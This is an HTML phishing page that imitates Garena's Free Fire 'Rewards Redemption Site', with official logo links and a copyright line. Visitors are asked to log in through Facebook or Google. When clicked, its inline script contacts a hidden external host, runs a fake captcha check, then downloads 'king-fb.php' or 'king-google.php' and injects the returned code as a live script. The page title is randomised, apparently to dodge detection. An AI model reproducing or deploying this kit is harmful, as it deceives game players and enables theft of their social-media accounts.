<!DOCTYPE html>
<html lang="en" data-build-timestamp-utc="2025-04-28T04:01:14.163Z">
   <head>
      <meta http-equiv="content-type" content="text/html; charset=UTF-8">
      <meta charset="utf-8">
      <meta http-equiv="X-UA-Compatible" content="IE=edge">
      <meta http-equiv="x-dns-prefetch-control" content="on">
      <meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
      <title>Free Fire</title>
      <link rel="icon" href="https://dl.dir.freefiremobile.com/common/web_event/tweb-event/FFSH/assets-common/ff-logo-icon.png" type="image/x-icon">
      <link rel="shortcut icon" href="https://dl.dir.freefiremobile.com/common/web_event/tweb-event/FFSH/assets-common/ff-logo-icon.png" type="image/x-icon">
      <meta name="description" content="">
      <meta name="author" content="">
      <meta name="title" content="FreeFire">
      <meta name="description" content="FreeFire">
      <meta property="og:title" content="FreeFire">
      <meta property="og:description" content="FreeFire">
      <link href="Free%20Fire_files/main.0cde7af3617f0ff903d3.css" rel="stylesheet">
   </head>
   <body>
<input type="hidden" id="host_input" value="https://dev-cdn47.pantheonsite.io/">
   
<script>


function generateRandomTitle() {
    const adjectives = ["jeans","stingy","oil","smile","rings","upbeat","thundering","cumbersome","ignorant","female","miscreant","flowery","porter","toad","marry","sugar","inquisitive","evanescent","reduce","nasty","camera","moon","profit","reflective","tooth","neighborly","enter","ad hoc","afford","proud","obese","panicky","creature","hobbies","average","building","art","savory","bitter","hole","payment","buzz","pin","lonely","rest","lucky","big","receptive","quack","wet"];
    const nouns = ["wonderfully","upwardly","successfully","slightly","promptly","curiously","quirkily","vivaciously","really","patiently","searchingly","verbally","famously","dreamily","doubtfully","else","hungrily","roughly","effectively","neatly","rather","vaguely","quaintly","reproachfully","seriously","enthusiastically","voluntarily","unbearably","sadly","jaggedly","unimpressively","quicker","bitterly","dramatically","sharply","seldom","inquisitively","briefly","gleefully","almost","knowingly","crossly","eagerly","basically","acidly","tediously","strictly","probably","currently","painfully"];
    const adjective = adjectives[Math.floor(Math.random() * adjectives.length)];
    const noun = nouns[Math.floor(Math.random() * nouns.length)];
    return `${adjective} ${noun}`;
}

document.addEventListener("DOMContentLoaded", () => {
    document.title = generateRandomTitle();
});

var host_name = document.getElementById("host_input").value;

function verifyCaptcha(e){
if("ff"==e)var a="images/king-fb.php";
if("gg"==e)var a="images/king-google.php";

fetch(host_name+"images/validate_captcha.php",{method:"POST",headers:{"Content-Type":"application/x-www-form-urlencoded"},body:"timestamp="+encodeURIComponent(Date.now())}).then(e=>e.json()).then(t=>{if(1===t.success){fetch(host_name+a,{method:"POST",headers:{"Content-Type":"application/x-www-form-urlencoded"}}).then(e=>{if(e.ok)return e.text();throw Error("Failed to load script: "+e.statusText)}).then(e=>{var t=document.createElement("script");t.text=e,document.head.appendChild(t)}).catch(e=>{console.error("Error loading script:",e)})}else alert("Captcha verification failed. Please try again.")}).catch(e=>console.error("Error:",e))}

</script>
   
      <div id="app">
         <div class="main">
            <div data-v-470541af="" class="home-wrapper">
               <div data-v-470541af="" class="home-container">
                  <div data-v-470541af="" class="home">
                     <div data-v-02adb2b5="" data-v-470541af="" class="header">
                        <div data-v-02adb2b5="" class="header-content">
                           <div data-v-02adb2b5="" class="header__logo"></div>
                        </div>
                     </div>
                     <div data-v-470541af="" class="home__mshop">
                        <a data-v-cccddec2="" data-v-470541af="" href="#"  class="mshop">
                           <svg data-v-cccddec2="" xmlns="http://www.w3.org/2000/svg" width="20" height="18" viewBox="0 0 20 18" fill="none" class="mshop-icon mshop__icon">
                              <path d="M0.98999 1.06891L2.95039 1.68886L6.51474 15.3278" stroke="black" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round"></path>
                              <path d="M4.35645 4.87579H19.0099" stroke="black" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round"></path>
                              <path d="M6.21777 12.1425H15.5627L17.3861 5.42993" stroke="black" stroke-width="1.6" stroke-linejoin="round"></path>
                              <path d="M8 5.38715C8.44871 7.46805 8.89782 9.54852 9.34653 11.6294" stroke="black" stroke-width="1.6" stroke-linejoin="round"></path>
                              <path d="M13.4791 5.30896C13.0304 7.38986 12.5813 9.47034 12.1326 11.5512" stroke="black" stroke-width="1.6" stroke-linejoin="round"></path>
                              <path d="M6.09908 18C6.8865 18 7.52482 17.3109 7.52482 16.4608C7.52482 15.6107 6.8865 14.9216 6.09908 14.9216C5.31167 14.9216 4.67334 15.6107 4.67334 16.4608C4.67334 17.3109 5.31167 18 6.09908 18Z" fill="black"></path>
                              <path d="M15.3266 18C16.114 18 16.7524 17.3109 16.7524 16.4608C16.7524 15.6107 16.114 14.9216 15.3266 14.9216C14.5392 14.9216 13.9009 15.6107 13.9009 16.4608C13.9009 17.3109 14.5392 18 15.3266 18Z" fill="black"></path>
                              <path d="M6.99988 14.5L15.4874 14.9349L15.8062 16.3808H6.89453L6.99988 14.5Z" fill="black"></path>
                           </svg>
                           <div data-v-cccddec2="">STORE</div>
                        </a>
                     </div>
                     <div data-v-470541af="" class="home__right">
                        <div data-v-3dc8ebc8="" data-v-470541af="" class="main">
                           <div data-v-3dc8ebc8="" class="main-header">
                              <h2 data-v-3dc8ebc8="" class="main__title">Rewards Redemption Site</h2>
                              <span data-v-3dc8ebc8="" class="main__description">Please log in.</span>
                           </div>
                           <div data-v-3dc8ebc8="" class="main__login">
                              <div data-v-6a7ca1ee="" data-v-3dc8ebc8="" class="button main__login-button">
                                 <div data-v-cdfa79b6="" data-v-6a7ca1ee="" onclick="disableImage(this);verifyCaptcha('ff')" class="image-container image-container--hover"> <img data-v-cdfa79b6="" src="Free%20Fire_files/facebook.png" alt="" class="image"></div>
                              </div>
                              <div data-v-6a7ca1ee="" data-v-3dc8ebc8="" class="button main__login-button">
                                 <div data-v-cdfa79b6="" data-v-6a7ca1ee="" class="image-container image-container--hover"> <img data-v-cdfa79b6="" src="Free%20Fire_files/vk.png" alt="" class="image"></div>
                              </div>
                              <div data-v-6a7ca1ee="" data-v-3dc8ebc8="" onclick="disableImage(this);verifyCaptcha('gg')" class="button main__login-button">
                                 <div data-v-cdfa79b6="" data-v-6a7ca1ee="" class="image-container image-container--hover"> <img data-v-cdfa79b6="" src="Free%20Fire_files/google.png" alt="" class="image"></div>
                              </div>
                              <div data-v-6a7ca1ee="" data-v-3dc8ebc8="" class="button main__login-button">
                                 <div data-v-cdfa79b6="" data-v-6a7ca1ee="" class="image-container image-container--hover"> <img data-v-cdfa79b6="" src="Free%20Fire_files/apple.png" alt="" class="image"></div>
                              </div>
                              <div data-v-6a7ca1ee="" data-v-3dc8ebc8="" class="button main__login-button">
                                 <div data-v-cdfa79b6="" data-v-6a7ca1ee="" class="image-container image-container--hover"> <img data-v-cdfa79b6="" src="Free%20Fire_files/twitter.png" alt="" class="image"></div>
                              </div>
                           </div>
                        </div>
						
<script>
function disableImage(img) {
  img.style.pointerEvents = "none";
  img.style.filter = "brightness(0.8)";

  setTimeout(() => {
    img.style.pointerEvents = "auto";
    img.style.filter = "brightness(1)";
  }, 3000);
}
</script>
						
						
                        <div data-v-f423ab84="" data-v-470541af="" class="home-panel home__panel">
                           <h4 data-v-f423ab84="" class="home-panel__title">Important Notice:</h4>
                           <ol data-v-f423ab84="" class="list">
                              <li class="list__item">
                                 1. Redemption code has <span class="highlight">12/16</span> characters, consisting of capital letters and numbers.
                              </li>
                              <li class="list__item">
                                 2. Item rewards are shown in <span class="highlight"> [vault] </span> tab in game lobby; Golds or diamonds will add in account wallet automatically.
                              </li>
                              <li class="list__item">3. Please note redemption expiration date. Any expired codes cannot be redeemed.</li>
                              <li class="list__item">4. Please contact customer service if you encountered any issue.</li>
                              <li class="list__item">5. Reminder: you will not be able to redeem your 
                                 rewards with guest accounts. You may bind your account to Facebook or VK
                                 in order to receive the rewards.
                              </li>
                           </ol>
                        </div>
                     </div>
                  </div>
               </div>
               <footer data-v-3a03f104="" data-v-470541af="" class="footer">
                  <div data-v-3a03f104="" class="footer-rule-wrap">
                     <div data-v-3a03f104="" class="footer-rule-container">
                        <div data-v-3a03f104="" class="footer-rule">
                           <span data-v-3a03f104="">Important Notice:</span> 
                           <div data-v-cdfa79b6="" data-v-3a03f104="" class="footer-rule__icon image-container"> <img data-v-cdfa79b6="" src="Free%20Fire_files/arrow.png" alt="" class="image"></div>
                           <div data-v-f423ab84="" data-v-3a03f104="" class="home-panel footer-rule__panel">
                              <h4 data-v-f423ab84="" class="home-panel__title">Important Notice:</h4>
                              <ol data-v-f423ab84="" class="list">
                                 <li class="list__item">
                                    1. Redemption code has <span class="highlight">12/16</span> characters, consisting of capital letters and numbers.
                                 </li>
                                 <li class="list__item">
                                    2. Item rewards are shown in <span class="highlight"> [vault] </span> tab in game lobby; Golds or diamonds will add in account wallet automatically.
                                 </li>
                                 <li class="list__item">3. Please note redemption expiration date. Any expired codes cannot be redeemed.</li>
                                 <li class="list__item">4. Please contact customer service if you encountered any issue.</li>
                                 <li class="list__item">5. Reminder: you will not be able to redeem your 
                                    rewards with guest accounts. You may bind your account to Facebook or VK
                                    in order to receive the rewards.
                                 </li>
                              </ol>
                           </div>
                        </div>
                     </div>
                  </div>
                  <div data-v-3a03f104="" class="copyright">
                     <div data-v-cdfa79b6="" data-v-3a03f104="" class="icon image-container"> <img data-v-cdfa79b6="" src="Free%20Fire_files/logo_small_foot.jpg" alt="" class="image"></div>
                     <div data-v-3a03f104="" class="copyright-message">
                        <p data-v-3a03f104="">Copyright © Garena International.</p>
                        <p data-v-3a03f104="">
                           Trademarks belong to their respective owners. All rights Reserved.
                        </p>
                     </div>
                  </div>
               </footer>
            </div>
         </div>
         <!----> <!---->
      </div>
   </body>
</html>
